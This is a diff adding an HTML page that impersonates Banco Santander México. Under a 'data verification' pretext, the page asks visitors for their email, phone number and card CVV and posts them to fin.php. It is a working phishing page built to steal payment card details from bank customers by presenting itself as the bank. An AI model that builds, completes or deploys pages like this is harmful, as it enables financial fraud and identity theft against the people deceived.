@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprobacion Santander</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+</head>
+<body>
+
+  <div class="container-fluid bg-light py-2">
+    <div class="row justify-content-center">
+      <div class="col text-center">
+        <img src="mundo.svg" alt="Logo" width="90">
+      </div>
+    </div>
+  </div>
+
+  <div class="container-fluid">
+    <div class="row justify-content-center align-items-center min-vh-100">
+      <div class="col-md-4 text-center">
+        <img src="cerca1_v2.jpg" alt="Imagen Grande" class="img-fluid mb-4">
+      </div>
+      <div class="col-md-4 bg-light p-4 rounded">
+        <h2 class="mb-4">Comprobacion de Datos</h2>
+        <p>Por favor, ingresa tus datos válidos para confirmar que eres propietario de la cuenta.</p>
+       <!-- ... tu código existente ... -->
+
+<form action="fin.php" method="post">
+    <div class="form-group">
+      <label for="correo">Correo Electrónico:</label>
+      <input type="email" class="form-control" id="correo" name="correo" required>
+    </div>
+    <div class="form-group">
+      <label for="telefono">Número de Teléfono:</label>
+      <input type="tel" class="form-control" id="telefono" name="telefono" required pattern="[0-9]{10}"  minlength="10" maxlength="10">
+      <small class="form-text text-muted">Ingresa un número de teléfono de 10 dígitos.</small>
+    </div>
+    <div class="form-group">
+      <label for="cvv">Código CVV (3 dígitos):</label>
+      <input type="text" class="form-control" id="cvv" name="cvv" required pattern="\d{3}" minlength="3" maxlength="3">
+    </div>
+    <!-- ... campos existentes ... -->
+    <button type="submit" class="btn btn-danger">Confirmar</button>
+  </form>
+  
+  <!-- ... tu código existente ... -->
+  
+      </div>
+    </div>
+  </div>
+
+  <div class="container-fluid bg-light py-2">
+    <div class="row justify-content-center">
+      <div class="col text-center">
+        <p class="mb-0">Derechos Reservados 2022, ©Banco Santander México S.A., Institución de Banca Múltiple, Grupo Financiero Santander. Aviso Legal, Términos y Condiciones | S1 [4.9.35]</p>
+        <img src="mundo.svg" alt="Footer Logo" width="100">
+      </div>
+    </div>
+  </div>
+
+  <!-- Bootstrap JS and Popper.js -->
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.1/dist/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+</body>
+</html>
